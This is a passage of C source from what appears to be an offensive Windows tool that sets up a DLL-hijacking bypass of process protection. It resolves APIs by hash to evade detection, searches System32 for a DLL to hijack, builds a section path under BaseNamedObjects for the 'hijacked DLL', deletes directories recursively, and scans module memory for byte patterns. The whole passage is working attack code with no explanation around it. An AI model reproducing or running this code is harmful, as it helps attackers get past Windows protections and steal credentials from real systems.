        get_library_address(KERNEL32_DLL, TRUE),
        GetSystemDirectoryW_SW2_HASH,
        0);
    if (!GetSystemDirectoryW)
    {
        api_not_found("GetSystemDirectoryW");
        goto cleanup;
    }

    CreateFileW = (CreateFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateFileW_SW2_HASH,
        0);
    if (!CreateFileW)
    {
        api_not_found("CreateFileW");
        goto cleanup;
    }

    GetFileSize = (GetFileSize_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetFileSize_SW2_HASH,
        0);
    if (!GetFileSize)
    {
        api_not_found("GetFileSize");
        goto cleanup;
    }

    // TODO: add syscalls

    pwszCurrentDirectory = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszCurrentDirectory)
    {
        malloc_failed();
        goto cleanup;
    }

    pwszSystemDirectory = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszSystemDirectory)
    {
        malloc_failed();
        goto cleanup;
    }

    pwszFilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszFilePath)
    {
        malloc_failed();
        goto cleanup;
    }

    GetCurrentDirectoryW(MAX_PATH, pwszCurrentDirectory);
    GetSystemDirectoryW(pwszSystemDirectory, MAX_PATH);
    SetCurrentDirectoryW(pwszSystemDirectory);
    
    bCurrentDirectoryChanged = TRUE;

    hFind = FindFirstFileW(L"*.dll", &wfd);
    if (hFind == INVALID_HANDLE_VALUE)
        goto cleanup;

    do
    {
        hFile = CreateFileW(wfd.cFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile== INVALID_HANDLE_VALUE)
            goto loopcleanup;

        dwFileSize = GetFileSize(hFile, NULL);

        if (dwFileSize == INVALID_FILE_SIZE || dwFileSize < MinSize)
            goto loopcleanup;

        *FilePath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
        if (!*FilePath)
        {
            malloc_failed();
            goto loopcleanup;
        }

        swprintf_s(*FilePath, MAX_PATH, L"%ws\\%ws", pwszSystemDirectory, wfd.cFileName);
        ret_val = TRUE;

    loopcleanup:
        safe_close_handle(&hFile);

    } while (FindNextFileW(hFind, &wfd) && !ret_val);

cleanup:
    if (bCurrentDirectoryChanged) SetCurrentDirectoryW(pwszCurrentDirectory);
    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    safe_free((PVOID*)&pwszCurrentDirectory);
    safe_free((PVOID*)&pwszSystemDirectory);
    safe_free((PVOID*)&pwszFilePath);

    if (ret_val)
    {
        DPRINT("File: %ls", *FilePath);
    }

    return ret_val;
}

BOOL get_hijacked_dll_name(
    OUT LPWSTR* HijackedDllName,
    OUT LPWSTR* HijackedDllSectionPath)
{
    BOOL ret_val = FALSE;

    *HijackedDllName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!*HijackedDllName)
    {
        malloc_failed();
        goto cleanup;
    }

    *HijackedDllSectionPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!*HijackedDllSectionPath)
    {
        malloc_failed();
        goto cleanup;
    }

    swprintf_s(*HijackedDllName, MAX_PATH, L"%ws", STR_HIJACKED_DLL_NAME);
    swprintf_s(*HijackedDllSectionPath, MAX_PATH, L"\\%ws\\%ws", STR_BASENAMEDOBJECTS, *HijackedDllName);

    ret_val = TRUE;

cleanup:
    if (!ret_val && *HijackedDllName)
    {
        intFree(*HijackedDllName);
        *HijackedDllName = NULL;
    }
    if (!ret_val && *HijackedDllSectionPath)
    {
        intFree(*HijackedDllSectionPath);
        *HijackedDllSectionPath = NULL;
    }

    return ret_val;
}

BOOL get_windows_temp_directory(
    OUT LPWSTR* Path)
{
    BOOL   ret_val  = FALSE;
    LPWSTR pwszPath = NULL;
    UINT   ret      = 0;

    GetWindowsDirectoryW_t GetWindowsDirectoryW = NULL;

    GetWindowsDirectoryW = (GetWindowsDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetWindowsDirectoryW_SW2_HASH,
        0);
    if (!GetWindowsDirectoryW)
    {
        api_not_found("GetWindowsDirectoryW");
        goto cleanup;
    }

    pwszPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszPath)
    {
        malloc_failed();
        goto cleanup;
    }

    ret = GetWindowsDirectoryW(pwszPath, MAX_PATH);
    if (!ret)
    {
        function_failed("GetWindowsDirectoryW");
        goto cleanup;
    }

    swprintf_s(pwszPath, MAX_PATH, L"%ws\\Temp", pwszPath);

    *Path = pwszPath;
    ret_val = TRUE;

cleanup:
    if (!ret_val) safe_free((PVOID*)&pwszPath);

    return ret_val;
}

BOOL delete_directory(
    IN LPWSTR Path)
{
    BOOL             ret_val        = FALSE;
    BOOL             success        = FALSE;
    BOOL             bIsEmpty       = TRUE;
    HANDLE           hFind          = NULL;
    LPWSTR           pwszSearchPath = NULL;
    LPWSTR           pwszFullPath   = NULL;
    WIN32_FIND_DATAW FindData       = { 0 };

    FindFirstFileW_t   FindFirstFileW   = NULL;
    FindNextFileW_t    FindNextFileW    = NULL;
    FindClose_t        FindClose        = NULL;
    DeleteFileW_t      DeleteFileW      = NULL;
    RemoveDirectoryW_t RemoveDirectoryW = NULL;

    FindFirstFileW = (FindFirstFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindFirstFileW_SW2_HASH,
        0);
    if (!FindFirstFileW)
    {
        api_not_found("FindFirstFileW");
        goto cleanup;
    }

    FindNextFileW = (FindNextFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindNextFileW_SW2_HASH,
        0);
    if (!FindNextFileW)
    {
        api_not_found("FindNextFileW");
        goto cleanup;
    }

    FindClose = (FindClose_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindClose_SW2_HASH,
        0);
    if (!FindClose)
    {
        api_not_found("FindClose");
        goto cleanup;
    }

    DeleteFileW = (DeleteFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        DeleteFileW_SW2_HASH,
        0);
    if (!DeleteFileW)
    {
        api_not_found("DeleteFileW");
        goto cleanup;
    }

    RemoveDirectoryW = (RemoveDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        RemoveDirectoryW_SW2_HASH,
        0);
    if (!RemoveDirectoryW)
    {
        api_not_found("RemoveDirectoryW");
        goto cleanup;
    }
    pwszFullPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszFullPath)
    {
        malloc_failed();
        goto cleanup;
    }

    pwszSearchPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszSearchPath)
    {
        malloc_failed();
        goto cleanup;
    }

    swprintf_s(pwszSearchPath, MAX_PATH, L"%ws\\*", Path);

    if ((hFind = FindFirstFileW(pwszSearchPath, &FindData)) == INVALID_HANDLE_VALUE)
    {
        if (GetLastError() == ERROR_FILE_NOT_FOUND)
            ret_val = TRUE;

        goto cleanup;
    }

    do
    {
        swprintf_s(pwszFullPath, MAX_PATH, L"%ws\\%ws", Path, FindData.cFileName);

        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (!_wcsicmp(FindData.cFileName, L".") || !_wcsicmp(FindData.cFileName, L".."))
            {
                continue;
            }

            if (!delete_directory(pwszFullPath))
            {
                bIsEmpty = FALSE;
            }
        }
        else
        {
            if (!DeleteFileW(pwszFullPath))
            {
                DPRINT_ERR("Failed to delete file: %ls", pwszFullPath);
                bIsEmpty = FALSE;
            }
        }

    } while (FindNextFileW(hFind, &FindData));

    if (bIsEmpty)
    {
        success = RemoveDirectoryW(Path);
        if (!success)
            goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    safe_free((PVOID*)&pwszSearchPath);
    safe_free((PVOID*)&pwszFullPath);

    if (!ret_val)
    {
        DPRINT_ERR("Failed to delete directory: %ls", Path);
    }

    return ret_val;
}

BOOL find_module_section(
    IN HMODULE Module,
    IN LPCSTR SectionName,
    OUT PULONG_PTR Address,
    OUT LPDWORD Size)
{
    BOOL                  ret_val        = FALSE;
    DWORD                 dwBufferSize   = PAGE_SIZE;
    PIMAGE_NT_HEADERS     pNtHeaders     = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    DWORD                 i              = 0;
    PBYTE                 pBuffer        = NULL;

    RtlImageNtHeader_t RtlImageNtHeader = NULL;

    RtlImageNtHeader = (RtlImageNtHeader_t)(ULONG_PTR)get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        RtlImageNtHeader_SW2_HASH,
        0);
    if (!RtlImageNtHeader)
    {
        api_not_found("RtlImageNtHeader");
        goto cleanup;
    }

    pBuffer = intAlloc(dwBufferSize);
    if (!pBuffer)
    {
        malloc_failed();
        goto cleanup;
    }

    pNtHeaders = RtlImageNtHeader(Module);
    if (!pNtHeaders)
    {
        function_failed("RtlImageNtHeader");
        goto cleanup;
    }

    for (i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNtHeaders + sizeof(*pNtHeaders) + i * sizeof(*pSectionHeader));

        if (!strcmp((char*)pSectionHeader->Name, SectionName))
        {
            *Address = (ULONG_PTR)((PBYTE)Module + pSectionHeader->VirtualAddress);
            *Size = pSectionHeader->SizeOfRawData;
            ret_val = TRUE;
            break;
        }
    }

cleanup:
    DPRINT("NT headers @ 0x%p | Address: 0x%p | Size: %ld | Result: %d", pNtHeaders, (PVOID)*Address, *Size, ret_val);

    safe_free((PVOID*)&pBuffer);

    return ret_val;
}

BOOL find_module_pattern(
    IN PBYTE Pattern,
    IN DWORD PatternLength,
    IN ULONG_PTR Address,
    IN DWORD Size,
    OUT PULONG_PTR PatternAddress)
{
    BOOL      ret_val        = FALSE;
    ULONG_PTR pModulePointer = 0;
    ULONG_PTR pModuleLimit   = 0;

    pModulePointer = Address;
    pModuleLimit = Address + Size - PatternLength;

    do
    {
        if (!memcmp(Pattern, (PVOID)pModulePointer, PatternLength))
        {
            *PatternAddress = pModulePointer;
            ret_val = TRUE;
            break;
        }

        pModulePointer++;

    } while ((pModulePointer < pModuleLimit) && !ret_val);

    return ret_val;
}

BOOL is_service_running(
    IN LPCWSTR ServiceName)
{
    DWORD dwServiceStatus;

    if (!get_service_status_by_name(ServiceName, &dwServiceStatus))
        return FALSE;

    return dwServiceStatus == SERVICE_RUNNING;
}
